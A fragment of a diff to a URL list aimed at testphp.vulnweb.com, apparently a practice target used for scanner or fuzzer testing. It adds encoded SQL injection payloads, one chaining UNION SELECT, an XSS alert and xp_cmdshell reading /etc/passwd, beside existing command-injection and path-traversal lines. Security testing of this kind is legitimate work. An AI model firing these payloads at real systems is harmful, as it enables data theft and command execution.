@@ -74,7 +74,8 @@ http://testpho.vulnweb.com:80/listproducts.php?cat=1
 http://testphp.vulnweb.com/%CB%93%E2%86%92artists.php?artist=0
 http://testphp.vulnweb.com/%CB%93%E2%86%92listproducts.php?cat=FUZZ
 http://testphp.vulnweb.com/?%3Fcmd=exec(%27cat%20%2Fetc%2Fpasswd%27)
-http://testphp.vulnweb.com/?%3Fid=1
+http://testphp.vulnweb.com/?%3Fid=%28SELECT%20%28CASE%20WHEN%20%281528%3D9439%29%20THEN%201%20ELSE%20%28SELECT%209439%20UNION%20SELECT%202819%29%20END%29%29
+http://testphp.vulnweb.com/?%3Fid=1&uHiF=6004%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
 http://testphp.vulnweb.com/?YXBz=7216%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
 http://testphp.vulnweb.com/?cmd=%24%7Bvar%7D+%3D+%27%26%26+ls+-la%27%3B
 http://testphp.vulnweb.com/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
